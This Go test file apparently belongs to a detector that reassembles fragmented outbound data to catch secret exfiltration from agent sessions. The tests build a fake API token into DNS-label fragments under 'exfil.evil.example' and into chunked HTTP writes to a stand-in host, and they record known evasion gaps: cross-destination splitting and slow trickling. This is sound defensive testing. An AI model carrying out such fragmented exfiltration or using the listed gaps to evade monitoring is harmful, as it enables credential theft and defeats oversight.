package engine

import (
	"fmt"
	"testing"
	"time"

	"github.com/yxshwanth/Interlock/internal/model"
)

func TestEgressReassembly_DNSFragmentsSameDestination_EXFIL(t *testing.T) {
	eng, _ := newTestEngine("block")
	sid := "egress-reassembly-dns"
	secret := "sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef"
	eng.IngestResult(makeResultEvent(sid, "read_ticket", "tickets", 1,
		`{"content":[{"type":"text","text":"Token: `+secret+`"}]}`))

	frags := []string{
		secret[:10] + ".exfil.evil.example",
		secret[10:22] + ".exfil.evil.example",
		secret[22:34] + ".exfil.evil.example",
		secret[34:] + ".exfil.evil.example",
	}
	for i := 0; i < len(frags)-1; i++ {
		dec := eng.IngestSyscall(model.SyscallEvent{
			SessionID:      sid,
			Syscall:        "dns",
			DestIP:         "8.8.8.8",
			DestPort:       53,
			PID:            7704,
			Comm:           "reverse_shell",
			PayloadExcerpt: frags[i],
		})
		if dec.Verdict != "" {
			t.Fatalf("fragment %d should not trip yet, got %q", i, dec.Verdict)
		}
	}

	dec := eng.IngestSyscall(model.SyscallEvent{
		SessionID:      sid,
		Syscall:        "dns",
		DestIP:         "8.8.8.8",
		DestPort:       53,
		PID:            7704,
		Comm:           "reverse_shell",
		PayloadExcerpt: frags[len(frags)-1],
	})
	if dec.Verdict != model.VerdictExfil {
		t.Fatalf("expected EXFIL after reassembly, got %q", dec.Verdict)
	}
}

func TestEgressReassembly_WriteFragmentsSameDestination_EXFIL(t *testing.T) {
	eng, _ := newTestEngine("block")
	sid := "egress-reassembly-write"
	secret := "sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef"
	eng.IngestResult(makeResultEvent(sid, "read_ticket", "tickets", 1,
		`{"content":[{"type":"text","text":"Token: `+secret+`"}]}`))

	// Chunked TCP write splitting to the same dest — analog of DNS fragmentation
	// for sendto/write-shaped payloads (full excerpt, no DNS label trim).
	mid := len(secret) / 2
	dec1 := eng.IngestSyscall(model.SyscallEvent{
		SessionID:      sid,
		Syscall:        "sendto",
		DestIP:         "203.0.113.66",
		DestPort:       4444,
		PID:            8800,
		Comm:           "exfil",
		PayloadExcerpt: "POST /c HTTP/1.1\r\n\r\n" + secret[:mid],
	})
	if dec1.Verdict == model.VerdictExfil {
		t.Fatal("first write fragment alone should not prove EXFIL")
	}
	dec2 := eng.IngestSyscall(model.SyscallEvent{
		SessionID:      sid,
		Syscall:        "sendto",
		DestIP:         "203.0.113.66",
		DestPort:       4444,
		PID:            8800,
		Comm:           "exfil",
		PayloadExcerpt: secret[mid:],
	})
	if dec2.Verdict != model.VerdictExfil {
		t.Fatalf("expected EXFIL after same-dest write reassembly, got %q", dec2.Verdict)
	}
}

func TestEgressReassembly_CrossDestinationSplit_KnownGap(t *testing.T) {
	eng, _ := newTestEngine("block")
	sid := "egress-reassembly-cross-dest"
	secret := "sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef"
	eng.IngestResult(makeResultEvent(sid, "read_ticket", "tickets", 1,
		`{"content":[{"type":"text","text":"Token: `+secret+`"}]}`))

	frags := []string{
		secret[:10] + ".exfil.evil.example",
		secret[10:22] + ".exfil.evil.example",
		secret[22:34] + ".exfil.evil.example",
		secret[34:] + ".exfil.evil.example",
	}
	dests := []string{"8.8.8.8", "1.1.1.1", "8.8.8.8", "1.1.1.1"}
	for i := range frags {
		dec := eng.IngestSyscall(model.SyscallEvent{
			SessionID:      sid,
			Syscall:        "dns",
			DestIP:         dests[i],
			DestPort:       53,
			PID:            7704,
			Comm:           "reverse_shell",
			PayloadExcerpt: frags[i],
		})
		if dec.Verdict == model.VerdictExfil {
			t.Fatalf("unexpected EXFIL when fragments split across destinations at step %d", i)
		}
	}
}

func TestEgressReassembly_SlowTrickle_KnownGap(t *testing.T) {
	eng, _ := newTestEngine("block")
	eng.egressFragmentMaxAge = time.Second
	sid := "egress-reassembly-age"
	secret := "sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef"
	eng.IngestResult(makeResultEvent(sid, "read_ticket", "tickets", 1,
		`{"content":[{"type":"text","text":"Token: `+secret+`"}]}`))

	dec1 := eng.IngestSyscall(model.SyscallEvent{
		SessionID:      sid,
		Syscall:        "dns",
		DestIP:         "8.8.8.8",
		DestPort:       53,
		PID:            7704,
		Comm:           "reverse_shell",
		PayloadExcerpt: secret[:20] + ".exfil.evil.example",
		TSMono:         int64(1 * time.Second),
	})
	if dec1.Verdict != "" {
		t.Fatalf("first fragment should not trip, got %q", dec1.Verdict)
	}
	dec2 := eng.IngestSyscall(model.SyscallEvent{
		SessionID:      sid,
		Syscall:        "dns",
		DestIP:         "8.8.8.8",
		DestPort:       53,
		PID:            7704,
		Comm:           "reverse_shell",
		PayloadExcerpt: secret[20:] + ".exfil.evil.example",
		TSMono:         int64(3 * time.Second),
	})
	if dec2.Verdict == model.VerdictExfil {
		t.Fatal("expected miss when fragments arrive slower than reassembly age window")
	}
}

func TestEgressReassembly_ChunkCapEvictsOldFragments(t *testing.T) {
	eng, _ := newTestEngine("block")
	eng.egressFragmentMaxChunks = 2
	eng.egressFragmentMaxBytes = 4096
	sid := "egress-reassembly-chunks"
	secret := "sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef"
	eng.IngestResult(makeResultEvent(sid, "read_ticket", "tickets", 1,
		`{"content":[{"type":"text","text":"Token: `+secret+`"}]}`))

	frags := []string{
		secret[:12] + ".exfil.evil.example",
		secret[12:24] + ".exfil.evil.example",
		secret[24:] + ".exfil.evil.example",
	}
	for _, frag := range frags {
		_ = eng.IngestSyscall(model.SyscallEvent{
			SessionID:      sid,
			Syscall:        "dns",
			DestIP:         "8.8.8.8",
			DestPort:       53,
			PID:            7704,
			Comm:           "reverse_shell",
			PayloadExcerpt: frag,
		})
	}
	state := eng.store.Get(sid)
	key, _ := eng.egressFlowKey(model.SyscallEvent{PID: 7704, DestIP: "8.8.8.8", DestPort: 53})
	flow := state.EgressFlows[key]
	if flow == nil {
		t.Fatal("expected flow buffer")
	}
	if len(flow.Chunks) != 2 {
		t.Fatalf("chunks=%d want 2", len(flow.Chunks))
	}
	if flow.Chunks[0] == secret[:12] {
		t.Fatal("oldest fragment should be evicted")
	}
}

func TestEgressReassembly_MaxDestinationsPerSessionBounded(t *testing.T) {
	eng, _ := newTestEngine("block")
	eng.egressMaxFlows = 1
	sid := "egress-reassembly-flow-cap"
	secret := "sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef"
	eng.IngestResult(makeResultEvent(sid, "read_ticket", "tickets", 1,
		`{"content":[{"type":"text","text":"Token: `+secret+`"}]}`))

	for _, ip := range []string{"8.8.8.8", "1.1.1.1"} {
		_ = eng.IngestSyscall(model.SyscallEvent{
			SessionID:      sid,
			Syscall:        "dns",
			DestIP:         ip,
			DestPort:       53,
			PID:            7704,
			Comm:           "reverse_shell",
			PayloadExcerpt: "frag.exfil.evil.example",
			TSMono:         int64(time.Now().UnixNano()),
		})
	}
	state := eng.store.Get(sid)
	if state == nil {
		t.Fatal("missing session state")
	}
	if len(state.EgressFlows) != 1 {
		t.Fatalf("egress flow count=%d want 1", len(state.EgressFlows))
	}
	for k := range state.EgressFlows {
		want := fmt.Sprintf("%d|%s", 7704, "1.1.1.1:53")
		if k != want {
			t.Fatalf("expected newest flow key %q, got %q", want, k)
		}
	}
}
